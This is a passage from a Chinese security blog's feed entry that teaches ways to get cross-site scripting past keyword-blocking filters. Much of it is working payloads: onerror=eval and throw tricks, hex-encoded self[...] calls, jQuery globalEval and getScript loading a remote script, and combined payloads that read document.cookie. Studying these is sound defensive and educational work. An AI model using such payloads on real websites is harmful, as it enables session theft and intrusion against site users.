class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">&#123;onerror=<span class="built_in">eval</span>&#125;<span class="keyword">throw</span>&#123;<span class="attr">lineNumber</span>:<span class="number">1</span>,<span class="attr">columnNumber</span>:<span class="number">1</span>,<span class="attr">fileName</span>:<span class="number">1</span>,<span class="attr">message</span>:<span class="string">'alert\x281\x29'</span>&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>`</span><br></pre></td></tr></table></figure></p><p>最终，作者更是贴出了一种无需字符串的通用payload</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">throw</span>/a/,Uncaught=<span class="number">1</span>,g=alert,a=URL%<span class="number">2b0</span>,onerror=<span class="built_in">eval</span>,/<span class="number">1</span>/g%2ba[<span class="number">12</span>]%2b[<span class="number">1337</span>]%2ba[<span class="number">13</span>]&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可以看到，在该payloa中，作者非常巧妙的利用<code>a=URL+0</code>的方式将<code>function</code>与字符相加变为字符串，即a为<code>&quot;function URL() { [native code] }0&quot;</code>，然后从<code>a</code>取相应的字符使用。利用这种方式去拼接被过滤的关键词的确为一种很好的思路。<br><img src="https://i.loli.net/2019/06/17/5d078b1d0b5d277669.png" alt></p><p>还有通过使用类型错误自动将字符串发送到异常处理程序的方法，这使得我们完全不需要throw语句。<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span>TypeError.prototype.name ='=/',0[<span class="string">onerror=eval</span>][<span class="symbol">'/-alert(1)//'</span>]<span class="xml"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><h2 id="0x02-利用JavaScript全局变量绕过XSS过滤器"><a href="#0x02-利用JavaScript全局变量绕过XSS过滤器" class="headerlink" title="0x02 利用JavaScript全局变量绕过XSS过滤器"></a>0x02 利用JavaScript全局变量绕过XSS过滤器</h2><p>这里所说的javascript全局变量是指利用<code>self</code>或者<code>window</code>调用任意javascript代码。<br><img src="https://i.loli.net/2019/06/17/5d078da09539397951.png" alt><br>比如说调用<code>alert</code>方法，可以使用<code>self[&quot;alert&quot;]</code><br><img src="https://i.loli.net/2019/06/17/5d078e1fe3a7988325.png" alt><br>如果alert关键词被过滤，使用全局变量的方法甚至可以使用字符串拼接<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span>self[<span class="string">"al"+"ert"</span>](<span class="link">1</span>)<span class="xml"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>同样因为是在字符串中，可以使用十六进制编码、base64编码等<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/*</span><br><span class="line">** alert(document.cookie)</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">self["<span class="symbol">\x</span>61<span class="symbol">\x</span>6c<span class="symbol">\x</span>65<span class="symbol">\x</span>72<span class="symbol">\x</span>74"](</span><br><span class="line">    self["<span class="symbol">\x</span>64<span class="symbol">\x</span>6f<span class="symbol">\x</span>63<span class="symbol">\x</span>75<span class="symbol">\x</span>6d<span class="symbol">\x</span>65<span class="symbol">\x</span>6e<span class="symbol">\x</span>74"]</span><br><span class="line">        ["<span class="symbol">\x</span>63<span class="symbol">\x</span>6f<span class="symbol">\x</span>6f<span class="symbol">\x</span>6b<span class="symbol">\x</span>69<span class="symbol">\x</span>65"]</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>另外，网站中如果使用了jQuery之类的第三方库。可以利用这些第三方库中的全局变量<br>比如在JQuery中<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">self[<span class="string">"$"</span>][<span class="symbol">"globalEval"</span>]("alert(1)");</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">self[<span class="string">"\x24"</span>][<span class="symbol">"\x67\x6c\x6f\x62\x61\x6c\x45\x76\x61\x6c"</span>]</span><br><span class="line">("\x61\x6c\x65\x72\x74\x28\x31\x29");</span><br></pre></td></tr></table></figure></p><p>甚至可以使用<code>self[&quot;$&quot;][&quot;getScript&quot;](url)</code>来加载任意js文件<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self[<span class="string">"$"</span>][<span class="symbol">"getScript"</span>]("https://example.com/my.js");</span><br></pre></td></tr></table></figure></p><p>另外还可以使用javascript迭代器<code>Object.keys</code>和正则表达式的方法去获取指定函数。<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">a = function() &#123;</span><br><span class="line">    <span class="built_in">c</span>=<span class="number">0</span>; <span class="comment">// index counter</span></span><br><span class="line">    <span class="keyword">for</span>(i <span class="keyword">in</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(/^a[rel]+t$/.test(i)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">c</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">c</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// in one line</span></span><br><span class="line">a=()=&gt;&#123;<span class="built_in">c</span>=<span class="number">0</span>;<span class="keyword">for</span>(i <span class="keyword">in</span> <span class="keyword">self</span>)&#123;<span class="keyword">if</span>(/^a[rel]+t$/.test(i))&#123;<span class="keyword">return</span> <span class="built_in">c</span>&#125;<span class="built_in">c</span>++&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// then you can use a() with Object.keys</span></span><br><span class="line"><span class="comment">// alert("foo")</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">self</span>[<span class="type">Object</span>.keys(<span class="keyword">self</span>)[a()]](<span class="string">"foo"</span>)</span><br></pre></td></tr></table></figure></p><p>使用这些方法，可以说可以在很大程度上绕过一些检测关键字黑名单的waf了。</p><p>如果与第一种方法相结合，更是可以组合出更有效的payload<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span>throw/a/,Uncaught=1,g=alert,a=URL%2b0,self[<span class="string">`on`%2b`error`</span>]=eval,/1/g%2ba[<span class="string">12</span>]%2b"self[<span class="string">`document`</span>][<span class="symbol">`cookie`</span>]"%2ba[13]<span class="xml"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span>TypeError.prototype.name="=/",0[<span class="string">self[`on`%2b`error`</span>]=self[<span class="string">"eval"</span>]][<span class="string">"/-self[`alert`</span>](<span class="link">self[`document`][`cookie`]</span>)//"]<span class="xml"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="https://portswigger.net/blog/xss-without-parentheses-and-semi-colons" target="_blank" rel="noopener">https://portswigger.net/blog/xss-without-parentheses-and-semi-colons</a><br><a href="https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/" target="_blank" rel="noopener">https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;前段时间看到了&lt;a href=&quot;https://nosec.org/home/detail/2654
      
    
    </summary>
    
      <category term="web安全" scheme="http://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xss" scheme="http://zhengbao.wang/tags/xss/"/>
    
  </entry>
  
</feed>
